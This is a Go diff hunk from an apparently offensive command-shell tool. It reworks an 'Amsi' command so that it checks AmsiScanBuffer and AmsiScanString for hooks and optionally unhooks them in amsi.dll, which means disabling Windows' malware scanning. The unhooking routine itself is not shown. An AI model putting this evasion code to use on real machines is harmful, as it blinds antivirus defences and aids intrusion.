@@ -69,36 +69,34 @@ func Amsi(c *ishell.Context) {
 		unhook = true
 	}
 
-	hasAmsi, err := execute_assembly.HasAmsi()
-	if err != nil {
-		c.Printf("failed to check for amsi: %v\n", err)
-		return
+	fns := []string{
+		"AmsiScanBuffer",
+		"AmsiScanString",
 	}
 
-	if !hasAmsi {
-		c.Println("amsi not detected")
-		return
-	} else {
-		c.Println("amsi detected")
-	}
-
-	if unhook {
-		fns := []string{
-			"AmsiScanBuffer",
-			"AmsiScanString",
+	for _, fn := range fns {
+		hasAmsi, err := execute_assembly.HasAmsi(fn)
+		if err != nil {
+			c.Printf("failed to check for amsi: %v\n", err)
+			return
 		}
-
-		for _, fn := range fns {
-			dll, err := execute_assembly.UnhookFunction("amsi.dll", fn)
-			if err != nil {
-				c.Printf("failed to unhook %s: %v\n", fn, err)
-				return
+		if hasAmsi {
+			c.Printf("found %s\n", fn)
+			if unhook {
+				dll, err := execute_assembly.UnhookFunction("amsi.dll", fn)
+				if err != nil {
+					c.Printf("failed to unhook %s: %v\n", fn, err)
+					continue
+				}
+				c.Printf(
+					"unhooked %s at : 0x%08x + 0x%04x = 0x%08x\n",
+					fn, dll.DllBaseAddr, dll.FuncOffset, dll.FuncAddress)
 			}
-			c.Printf(
-				"unhooked %s at : 0x%08x + 0x%04x = 0x%08x\n",
-				fn, dll.DllBaseAddr, dll.FuncOffset, dll.FuncAddress)
+		} else {
+			c.Printf("%s is unhooked\n", fn)
 		}
 	}
+
 }
 
 func GetHostname() string {
